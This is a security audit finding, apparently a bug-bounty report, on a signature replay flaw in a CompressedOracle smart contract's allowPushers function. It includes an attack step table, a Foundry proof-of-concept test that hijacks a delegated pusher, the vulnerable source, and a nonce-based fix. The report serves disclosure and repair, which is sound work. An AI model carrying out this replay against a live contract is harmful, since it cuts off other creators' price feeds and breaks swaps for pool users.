### Title
Pusher Consent Signature Replay Within Deadline Window Allows Creator to Hijack Delegated Pusher from Another Creator — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary

`allowPushers` in `CompressedOracleV1` contains no nonce, no "used" flag, and no check on the current value of `namespaceRemapping[pusher]`. A pusher's EIP-191 consent signature is replayable any number of times within its deadline window. A creator who previously held a pusher's delegation can re-establish it using the old signature after the pusher has self-revoked and re-delegated to a different creator, silently overwriting the new delegation and diverting all future pushes back into the attacker's namespace.

### Finding Description

The signature domain bound by `allowPushers` is:

```
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
``` [1](#0-0) 

This binds chain, oracle address, deadline, pusher address, and the calling creator. It does **not** bind to the current state of `namespaceRemapping[pusher]`, and there is no nonce or consumed-flag. The function unconditionally overwrites `namespaceRemapping[pusher]` with `msg.sender` on every successful call: [2](#0-1) 

The code comment acknowledges that the deadline prevents re-establishing a delegation *after* it expires, but within the deadline window the same signature is accepted repeatedly with no state change required: [3](#0-2) 

**Attack path (analog to the double-vote NFT transfer bug):**

| Step | Action | `namespaceRemapping[P]` |
|------|--------|------------------------|
| 1 | Pusher P signs consent for creator A, deadline D1 = now + 30 days | — |
| 2 | Creator A calls `allowPushers(D1, [P], [sigA])` | `A` |
| 3 | Creator A calls `removePushers([P])` | `0` |
| 4 | Pusher P signs fresh consent for creator B, deadline D2 | — |
| 5 | Creator B calls `allowPushers(D2, [P], [sigB])` | `B` |
| 6 | Creator A replays old `sigA` via `allowPushers(D1, [P], [sigA])` | **`A`** ← overwritten |

After step 6, every fallback push from P lands in creator A's namespace. Creator B's feeds receive no further updates.

The `fallback` push path resolves the namespace at call time from `namespaceRemapping[msg.sender]`: [4](#0-3) 

So the namespace overwrite immediately redirects all of P's live pushes.

### Impact Explanation

Creator B's feeds stop receiving price updates. Once the feed's `refTime` exceeds `MAX_REF_STALENESS`, `AnchoredPriceProvider._readLeg` returns `ok = false`: [5](#0-4) 

`getBidAndAskPrice` then reverts `FeedStalled`: [6](#0-5) 

Every pool that uses creator B's feeds as its price reference becomes unable to execute swaps — broken core pool functionality causing unusable swap flows, matching the allowed impact gate.

### Likelihood Explanation

- Creator A retains the old `sigA` off-chain (they submitted it themselves in step 2).
- Creator A can monitor `PusherAuthorized` events to detect when P re-delegates to creator B.
- No privileged role is required; `allowPushers` is fully permissionless.
- The deadline can be set arbitrarily far in the future (no maximum is enforced), so the replay window can span months or years.

### Recommendation

Add a per-pusher nonce or a consumed-signature set so each consent signature can only establish one delegation:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers, include the current nonce in the signed digest:
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender, pusherNonce[pusher]++))
```

Alternatively, check that `namespaceRemapping[pusher]` is currently `address(0)` before accepting the signature, requiring a fresh signature whenever the pusher re-delegates.

### Proof of Concept

```solidity
// Foundry test sketch
function test_signatureReplayHijacksPusher() public {
    uint256 deadline = block.timestamp + 30 days;

    // Step 1-2: creator A establishes delegation
    bytes memory sigA = _signConsent(PUSHER_KEY, deadline, pusher, creatorA);
    vm.prank(creatorA);
    oracle.allowPushers(deadline, _arr(pusher), _arr(sigA));
    assertEq(oracle.namespaceRemapping(pusher), creatorA);

    // Step 3: creator A removes pusher
    vm.prank(creatorA);
    oracle.removePushers(_arr(pusher));
    assertEq(oracle.namespaceRemapping(pusher), address(0));

    // Step 4-5: pusher re-delegates to creator B
    uint256 deadline2 = block.timestamp + 30 days;
    bytes memory sigB = _signConsent(PUSHER_KEY, deadline2, pusher, creatorB);
    vm.prank(creatorB);
    oracle.allowPushers(deadline2, _arr(pusher), _arr(sigB));
    assertEq(oracle.namespaceRemapping(pusher), creatorB);

    // Step 6: creator A replays OLD sigA — overwrites creator B's delegation
    vm.prank(creatorA);
    oracle.allowPushers(deadline, _arr(pusher), _arr(sigA)); // same old sig!
    assertEq(oracle.namespaceRemapping(pusher), creatorA);   // hijacked

    // Pusher's next push lands in creator A's namespace, not creator B's
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 raw = _packRaw(1_000_000, 5, 3);
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
    assertTrue(ok);

    // Creator B's feed is empty — stale → FeedStalled on next pool swap
    assertEq(oracle.getOracleData(oracle.feedIdOf(creatorB, 0, 0)).price, 0);
    // Creator A's feed received the data
    assertGt(oracle.getOracleData(oracle.feedIdOf(creatorA, 0, 0)).price, 0);
}
```

    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
